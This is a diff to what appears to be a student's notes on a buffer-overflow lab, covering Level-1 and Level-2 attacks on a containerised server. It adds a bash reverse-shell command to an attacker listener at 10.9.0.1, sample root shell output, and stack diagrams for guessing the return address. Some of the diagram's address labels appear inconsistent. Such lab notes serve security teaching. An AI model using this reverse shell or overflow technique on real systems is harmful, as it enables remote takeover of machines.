@@ -18,7 +18,7 @@
 - The shellcode is provided, modify it to run arbitrary command, but ensure not to change the length of the argument string. For more information about shellcode, refer to the **Shellcode Development Lab**
 
 ## Task 2: Level-1 Attack
-- Target Server: `10.9.0.5:9090`
+- Target Server: `10.9.0.5:9090` (32-bit)
 - Send a benign message to the server:
     ```
     $ echo hello | nc 10.9.0.5 9090
@@ -127,6 +127,55 @@
         |          |---------------------|  <-- 0xffffd318 (ebp)
         |          |        NOPs         |
         |          |---------------------|  <-- 0xffffd2a8 (&buffer)
+        |          |        ...          |
+        |          +---------------------+
+        |          |    Unused Space     |
+        |          +---------------------+
+        |
+        Low Memory Addresses
+        ```
+
+- generating a reverse shell
+    - replace the command to: `/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1`
+    - on the attacker's machine:
+        ```
+        $ nc -l 9875
+        root@0a4c2c385474:/bof# ls
+        ls
+        core
+        server
+        stack
+        ```
+
+## Task 3: Level-2 Attack
+- Target Server: `10.9.0.6:9090` (32-bit)
+- the value of `ebp` will not be revealed
+- the buffer size is unknown (but we assume that the range of buffer size is `[100, 300]` in bytes)
+- due to the memory alignment, in 32-bit systems, the value stored in the frame pointer is always multiple of 4
+- by given any input, we can learn that `&buffer` is `0xffffd018`
+
+- solution:
+    1. `ret`: make it close to the shellcode, e.g., `ret = buff_addr + 320`
+    2. fill the first part of the buffer with the return address `ret`
+
+    - Stack After Buffer-Overflow
+        ```
+        High Memory Addresses
+        |          +---------------------+ 
+        |          |                     |
+        |          |     Shellcode       |
+        |          |                     |
+        |          +---------------------+
+        |          |        NOPs         |
+        |          |---------------------|  <-- 0xffffd318 + 320
+        |          |        NOPs         |
+        |          +---------------------+  <-- 0xffffd318 + 316
+        |          |   0xffffd018 + 320  |
+        |          +---------------------+  <-- 0xffffd018 + 312
+        |          |   0xffffd018 + 320  |
+        |          |---------------------|  <-- unknown (ebp)
+        |          |   0xffffd018 + 320  |
+        |          |---------------------|  <-- 0xffffd018 (&buffer)
         |          |        ...          |
         |          +---------------------+
         |          |    Unused Space     |
